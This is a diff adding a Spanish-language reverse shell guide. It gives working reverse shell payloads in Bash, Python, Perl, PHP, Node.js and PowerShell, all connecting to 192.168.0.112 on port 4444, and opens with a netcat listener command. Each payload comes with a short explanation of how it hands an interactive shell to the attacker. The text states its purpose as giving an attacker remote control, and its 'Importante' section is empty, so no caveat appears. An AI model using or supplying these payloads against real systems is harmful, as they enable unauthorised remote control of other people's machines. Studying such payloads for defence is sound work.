@@ -1,0 +1,144 @@
+Configurar el Servidor para Escuchar la Reverse Shell
+
+Para que estos scripts funcionen, el servidor debe estar escuchando en el puerto adecuado. Puedes utilizar nc (Netcat) para esto:
+
+nc -lvnp 4444
+
+Reemplaza 4444 con el puerto que has configurado en el script.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+Guía de Reverse Shells
+
+Una reverse shell permite que un atacante obtenga control remoto sobre un sistema, invirtiendo la conexión: 
+en lugar de que el atacante inicie sesión en el servidor, el servidor inicia una conexión hacia la máquina del atacante, que escucha en un puerto específico.
+Importante
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+Ejemplos de Reverse Shell en Diferentes Lenguajes
+
+
+    Este es uno de los métodos más comunes, ya que Bash está presente en la mayoría de los sistemas Unix.
+
+bash -i >& /dev/tcp/192.168.0.112/4444 0>&1
+
+Explicación:
+
+    bash -i: Inicia Bash en modo interactivo.
+    >& /dev/tcp/192.168.0.112/4444: Redirige la entrada y salida a la dirección IP y puerto especificados.
+    0>&1: Redirige el descriptor de archivo estándar de entrada al de salida, permitiendo interacción.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Python
+
+Python es otra opción popular para crear una reverse shell.
+
+python
+
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.0.112", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subprocess.call(["/bin/sh", "-i"])
+
+Explicación:
+
+    socket.socket(...): Crea un socket TCP.
+    s.connect(...): Conecta a la IP y puerto del atacante.
+    os.dup2(...): Redirige la entrada, salida y errores estándar al socket.
+    subprocess.call(...): Lanza un shell interactivo.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Perl
+
+Perl se encuentra en muchos sistemas Unix y ofrece una manera rápida de crear una reverse shell.
+
+perl
+
+use Socket;
+$i="192.168.0.112";
+$p=4444;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){
+    open(STDIN,">&S");
+    open(STDOUT,">&S");
+    open(STDERR,">&S");
+    exec("/bin/sh -i");
+}
+
+Explicación:
+
+    socket(...): Crea un socket TCP.
+    connect(...): Conecta al servidor del atacante.
+    open(...): Redirige la entrada, salida y errores estándar al socket.
+    exec(...): Lanza el shell interactivo.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+PHP
+
+Útil en servidores web donde PHP está habilitado.
+
+php
+
+<?php
+$sock=fsockopen("192.168.0.112",4444);
+exec("/bin/sh -i <&3 >&3 2>&3");
+?>
+
+Explicación:
+
+    fsockopen(...): Abre una conexión a la IP y puerto del atacante.
+    exec(...): Ejecuta un shell, redirigiendo la entrada y salida.
+
+Node.js
+
+Node.js es ideal en entornos JavaScript o sistemas que usen Node.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+javascript
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(4444, "192.168.0.112", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Evita que la aplicación de Node.js se cierre
+})();
+
+Explicación:
+
+    net.Socket(): Crea un nuevo socket para la conexión.
+    client.connect(...): Conecta a la IP y puerto.
+    client.pipe(...): Redirige la entrada del socket al shell.
+    sh.stdout.pipe(...): Redirige la salida estándar y de error del shell al socket.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+PowerShell (para Windows)
+
+PowerShell es muy común en sistemas Windows y permite un control directo.
+
+powershell
+
+    $client = New-Object System.Net.Sockets.TCPClient("192.168.0.112",4444)
+    $stream = $client.GetStream()
+    [byte[]]$bytes = 0..65535|%{0}
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+        $sendback = (iex $data 2>&1 | Out-String )
+        $sendback2  = $sendback + "PS " + (pwd).Path + "> "
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+        $stream.Write($sendbyte,0,$sendbyte.Length)
+        $stream.Flush()
+    }
+    $client.Close()
+
+    Explicación:
+        TCPClient(...): Conecta a la IP y puerto del atacante.
+        stream.Read(...): Lee los comandos del atacante y ejecuta.
+        stream.Write(...): Envía la salida al atacante.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
